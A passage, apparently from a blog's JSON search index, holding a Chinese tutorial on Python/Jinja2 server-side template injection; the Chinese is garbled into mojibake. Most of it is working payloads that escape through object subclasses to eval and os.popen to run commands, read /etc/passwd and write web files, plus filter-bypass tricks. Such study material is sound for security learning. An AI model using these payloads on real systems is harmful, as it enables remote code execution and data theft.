object.__subclasses__()[40]('/var/www/html/input', 'w').write('123') //æ‰§è¡Œä»»æ„å‘½ä»¤ ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls /var/www/html\").read()' ) object.__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls /var/www/html\").read()' ) æŸ¥æ‰¾å‘½ä»¤ {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__(\"os\").popen(\"id\").read()') }} //poppençš„å‚æ•°å°±æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} 3.å‘½ä»¤æ‰§è¡Œ1ã€os.system()ç”¨æ³•ï¼šos.system(command)ä½†æ˜¯ç”¨è¿™ä¸ªæ— æ³•å›æ˜¾ 2ã€os.popen()ç”¨æ³•ï¼šos.popen(command[,mode[,bufsize]]) popenæ–¹æ³•é€šè¿‡p.read()è·å–ç»ˆç«¯è¾“å‡ºï¼Œè€Œä¸”popenéœ€è¦å…³é—­close().å½“æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œclose()ä¸è¿”å›ä»»ä½•å€¼ï¼Œå¤±è´¥æ—¶ï¼Œclose()è¿”å›ç³»ç»Ÿè¿”å›å€¼ï¼ˆå¤±è´¥è¿”å›1ï¼‰. å¯è§å®ƒè·å–è¿”å›å€¼çš„æ–¹å¼å’Œos.systemä¸åŒã€‚è¿˜éœ€è¦äº†è§£ä¸€ä¸ªé­”æ³•å‡½æ•°globalsè¯¥å±æ€§æ˜¯å‡½æ•°ç‰¹æœ‰çš„å±æ€§,è®°å½•å½“å‰æ–‡ä»¶å…¨å±€å˜é‡çš„å€¼,å¦‚æœæŸä¸ªæ–‡ä»¶è°ƒç”¨äº†osã€sysç­‰åº“,ä½†æˆ‘ä»¬åªèƒ½è®¿é—®è¯¥æ–‡ä»¶æŸä¸ªå‡½æ•°æˆ–è€…æŸä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨globalså±æ€§è®¿é—®å…¨å±€çš„å˜é‡ã€‚è¯¥å±æ€§ä¿å­˜çš„æ˜¯å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸å¼•ç”¨ã€‚ ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls \").read()' ) 4ã€Bypasså¦‚æœé‡åˆ°äº†è¿‡æ»¤çš„æƒ…å†µï¼Œå¯ä»¥åˆ©ç”¨ä¸€ä¸‹æ–¹å¼ 1.æ‹¼æ¥ä¾‹å­ï¼š object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls') ####2.è¿‡æ»¤â€â€[] ä¾‹å­ï¼š å€ŸåŠ©requestå¯¹è±¡ï¼šrequestå˜é‡å¯ä»¥è®¿é—®æ‰€æœ‰å·²å‘é€çš„å‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥request.args.paramç”¨æ¥æ£€ç´¢æ–°çš„paramGETå‚æ•°çš„å€¼,å°†å…¶ä¸­çš„request.argsæ”¹ä¸ºrequest.valuesåˆ™åˆ©ç”¨postçš„æ–¹å¼è¿›è¡Œä¼ å‚ {{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&amp;path=/etc/passwd ####3.è¿‡æ»¤åŒä¸‹åˆ’çº¿__ è¿˜æ˜¯requestæ–¹æ³• ä¾‹å­ï¼š {{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ 4.è¿‡æ»¤ä¸€äº›å‡½æ•°åå¦‚__import__ç­‰ä¾‹å­ï¼š pythonçš„åˆå§‹æ¨¡å—_builtin__é‡Œæœ‰å¾ˆå¤šå±é™©çš„æ–¹æ³•ï¼Œä¸€æ¡è·¯æ²¡äº†å°±æ‰¾æ‰¾å…¶ä»–çš„è·¯æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨ eval() exec() execfile()ç­‰ __builtins__.eval() æ— ã€å‚è€ƒæ–‡ç«  https://www.cnblogs.com/bmjoker/p/13508538.html https://www.cnblogs.com/Xy--1/p/12841941.html#gallery-1","categories":[{"name":"å­¦ä¹ ","slug":"å­¦ä¹ ","permalink":"http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]}],"categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"},{"name":"å­¦ä¹ ","slug":"å­¦ä¹ ","permalink":"http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"http://h3geeker.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"CVEå¤ç°","slug":"CVEå¤ç°","permalink":"http://h3geeker.top/categories/CVE%E5%A4%8D%E7%8E%B0/"},{"name":"éšç¬”","slug":"éšç¬”","permalink":"http://h3geeker.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"å¤§èµ›wp","slug":"å¤§èµ›wp","permalink":"http://h3geeker.top/tags/%E5%A4%A7%E8%B5%9Bwp/"},{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"http://h3geeker.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"åšé¢˜è®°å½•","slug":"åšé¢˜è®°å½•","permalink":"http://h3geeker.top/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"name":"CVEæ¼æ´å¤ç°","slug":"CVEæ¼æ´å¤ç°","permalink":"http://h3geeker.top/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"CVE-2019-9081","slug":"CVE-2019-9081","permalink":"http://h3geeker.top/tags/CVE-2019-9081/"},{"name":"éšç¬”","slug":"éšç¬”","permalink":"http://h3geeker.top/tags/%E9%9A%8F%E7%AC%94/"},{"name":"CVEæ¼æ´å¤ç° , CVE-2019-8362","slug":"CVEæ¼æ´å¤ç°-CVE-2019-8362","permalink":"http://h3geeker.top/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-8362/"}]}